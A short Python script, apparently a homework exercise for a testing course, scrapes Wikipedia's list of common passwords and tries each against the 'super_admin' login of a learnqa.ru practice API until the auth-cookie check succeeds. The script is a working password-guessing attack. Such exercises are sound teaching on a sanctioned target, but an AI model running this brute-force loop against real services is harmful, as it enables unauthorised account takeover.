from bs4 import BeautifulSoup
import requests

url = 'https://en.wikipedia.org/wiki/List_of_the_most_common_passwords'
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
table = soup.find_all('table', {'class': 'wikitable'})[1]
rows = table.find_all('tr')[1:]

passwords = []
for row in rows:
    # columns = row.find_all('td')[1:]
    # for col in columns:
    #     password = col.text.strip()
    #     passwords.append(password)
    passwords += [el.text.strip() for el in row.find_all('td')[1:] ]


print(passwords)

login = 'super_admin'

# цикл по всем паролям
for password in passwords:
    # делаем запрос к первому методу, получаем авторизационную cookie
    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    payload = {'login': login, 'password': password}
    try:
        response1 = requests.post(url, data=payload)
        auth_cookie = response1.cookies.get('auth_cookie')
    except:
        print("Error during authorization")
        continue
    # делаем запрос ко второму методу с полученной cookie
    url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    cookies = {'auth_cookie': auth_cookie}
    try:
        response2 = requests.post(url, cookies=cookies)
        if response2.text == 'You are NOT authorized':
            continue
        else:
            print("Correct password is:", password)
            print(response2.text)
            break
    except:
        print("Error during check_auth_cookie")
        continue